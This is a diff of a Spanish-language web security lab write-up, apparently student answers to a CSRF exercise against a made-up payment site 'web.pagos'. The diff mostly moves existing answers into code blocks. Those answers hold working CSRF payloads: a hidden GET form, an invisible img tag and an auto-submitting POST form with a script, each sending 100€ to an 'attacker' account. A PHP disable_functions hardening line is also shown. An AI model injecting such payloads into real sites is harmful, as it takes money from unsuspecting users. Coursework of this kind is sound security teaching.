@@ -265,6 +265,7 @@ e) Por último, comprobando el flujo de la sesión del usuario. Analiza si está
    disable_functions = exec, passthru, shell_exec, system, proc_open, popen, curl_exec, parse_ini_file, show_source
 
 ---
+
 ## Parte 5 - CSRF
 Ahora ya sabemos que podemos realizar un ataque XSS. Hemos preparado el siguiente enlace: http://web.pagos/donate.php?amount=100&receiver=attacker, mediante el cual, cualquiera que haga click hará una donación de 100€ al nuestro usuario (con nombre 'attacker') de la famosa plataforma de pagos online 'web.pagos' (Nota: como en realidad esta es una dirección inventada, vuestro navegador os devolverá un error 404).
 
@@ -274,12 +275,16 @@ En el campo
 Team (Equipo) del formulario de edición de jugador (insert_player.php).
 
 Introduzco
-   1 OWASP <br><form action="http://web.pagos/donate.php" method="GET"><input type="hidden" name="amount" value="100"><input type="hidden" name="receiver" value="attacker"><input type="submit"
-     value="Profile"></form>
+   
+   ```html
+   1 OWASP <br><form action="http://web.pagos/donate.php" method="GET"><input type="hidden" name="amount" value="100"><input type="hidden" name="receiver" value="attacker"><input type="submit" value="Profile"></form>
+   ```
 
 b) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show\_comments.php).
- Excelente jugador. <img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
 
+   ```html
+   Excelente jugador. <img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;">
+   ```
 
 c) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
 Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).
@@ -291,5 +296,7 @@ Si es así, cuando el navegador intente cargar la imagen falsa (que en realidad 
 
 d) Si web.pagos modifica la página donate.phpdpara que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.
 
-Buena jugada.<form id="f" method="POST" action="http://web.pagos/donate.php" style="display:none"><input type="hidden" name="amount" value="100"><input type="hidden" name="receiver"
-     value="attacker"></form><script>document.getElementById('f').submit()</script>
+Buena jugada.
+```html
+<form id="f" method="POST" action="http://web.pagos/donate.php" style="display:none"><input type="hidden" name="amount" value="100"><input type="hidden" name="receiver" value="attacker"></form><script>document.getElementById('f').submit()</script>
+```
